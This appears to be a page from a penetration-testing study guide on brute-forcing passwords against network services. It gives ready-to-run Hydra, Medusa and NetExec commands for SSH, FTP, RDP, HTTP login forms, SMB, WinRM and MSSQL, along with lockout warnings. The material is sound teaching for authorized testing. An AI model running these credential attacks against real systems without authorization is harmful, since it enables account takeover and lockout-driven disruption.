---
title: "Network Services"
description: "Brute-forcing network services like SSH, FTP, RDP, SMB, and HTTP using tools like Hydra, Medusa, and NetExec."
tags:
  - password-cracking
  - brute-force
  - hydra
  - netexec
  - ssh
  - smb
  - rdp
---

# 🌐 Remote Password Attacks: Network Services

Offline password cracking (like Hashcat) is safe and silent. **Online password cracking** — actively guessing passwords against a live network service — is noisy, slow, and risky. It generates massive amounts of log data, risks triggering account lockouts, and often triggers intrusion detection systems (IDS) or fail2ban scripts.

However, when you have discovered valid usernames or have a highly targeted, small dictionary, online brute-forcing can secure initial access.

---

## 1️⃣ Essential Tools

The three primary tools for online brute-forcing are **Hydra**, **Medusa**, and **NetExec** (formerly CrackMapExec).

| Tool | Best Use Case | Strengths |
|------|---------------|-----------|
| **Hydra** | Web forms (HTTP/S), legacy protocols (FTP, Telnet). | Supports almost every protocol. Very flexible for complex HTTP forms. |
| **Medusa** | Standard network services (SSH, FTP). | Often more stable and slightly faster than Hydra on standard protocols. |
| **NetExec** | Active Directory environments, SMB, WinRM, MSSQL. | Understands AD contexts, checks for local admin rights, handles NTLM gracefully. |

---

## 2️⃣ Attacking with Hydra

Hydra is the Swiss Army knife of online brute-forcing.

### Basic Syntax
```bash
hydra -l <username> -P <passwords.txt> <target_ip> <protocol>
```

### SSH Brute-Forcing
```bash
# Brute-force a single known user
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh

# Brute-force using a list of users AND a list of passwords (VERY slow)
hydra -L users.txt -P passwords.txt 10.10.10.5 ssh -t 4
```
*Note: `-t 4` sets the number of parallel tasks to 4. SSH servers often drop connections if you use too many concurrent threads.*

### FTP Brute-Forcing
```bash
hydra -l admin -P passwords.txt 10.10.10.5 ftp
```

### RDP Brute-Forcing
```bash
hydra -l Administrator -P passwords.txt rdp://10.10.10.5
```

### HTTP POST Form Brute-Forcing
Hydra can brute-force web login forms. You must provide the URL path, the POST parameters, and the failure message string so Hydra knows when a guess is incorrect.

```bash
# Format: <path>:<form parameters>:<failure string>
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"
```
*Hint: Use Burp Suite to capture a failed login attempt to grab the exact parameter names and the failure message.*

---

## 3️⃣ Attacking with NetExec (formerly CrackMapExec)

In Windows and Active Directory environments, **NetExec** is significantly better than Hydra. It understands the SMB protocol deeply, handles domain vs. local accounts properly, and can tell you if the cracked account has administrative privileges.

### SMB Brute-Forcing
```bash
# Try a single user/password against an entire subnet
netexec smb 10.10.10.0/24 -u administrator -p Password123!

# Brute-force a specific user with a password list
netexec smb 10.10.10.5 -u admin -p passwords.txt

# Continue after finding a valid password (--continue-on-success)
netexec smb 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success
```

!!! concept
    Notice the `(Pwn3d!)` output in NetExec? This means the credentials you found aren't just valid — they also have **Local Administrator** rights on that specific machine, meaning you can execute code immediately (e.g., using `--exec-method smbexec`).

### WinRM Brute-Forcing
```bash
netexec winrm 10.10.10.5 -u administrator -p passwords.txt
```

### MSSQL Brute-Forcing
```bash
netexec mssql 10.10.10.5 -u sa -p passwords.txt
```

---

## 4️⃣ Risk: Account Lockouts

The greatest risk of online brute-forcing in enterprise environments is **Account Lockout**.

Most Active Directory environments have a lockout policy (e.g., 5 failed attempts within 15 minutes locks the account for 30 minutes). If you run `hydra` against an SMB or RDP service with `rockyou.txt`, you will lock out every user in your userlist within seconds, causing a massive denial-of-service and immediately alerting the SOC.

### How to Brute-Force Safely
To avoid lockouts, you must pivot from vertical brute-forcing to **Password Spraying** (trying one password against many users), which is covered in the next section.

If you *must* brute-force a single account:
1. Verify the lockout policy first (e.g., via an unauthenticated SMB null session or LDAP query if possible).
2. Insert massive delays between attempts to stay below the threshold window.

---

!!! warning
    **Online brute-forcing generates massive amounts of noise and can easily disrupt business operations through account lockouts. Exercise extreme caution and verify client lockout policies before proceeding.**
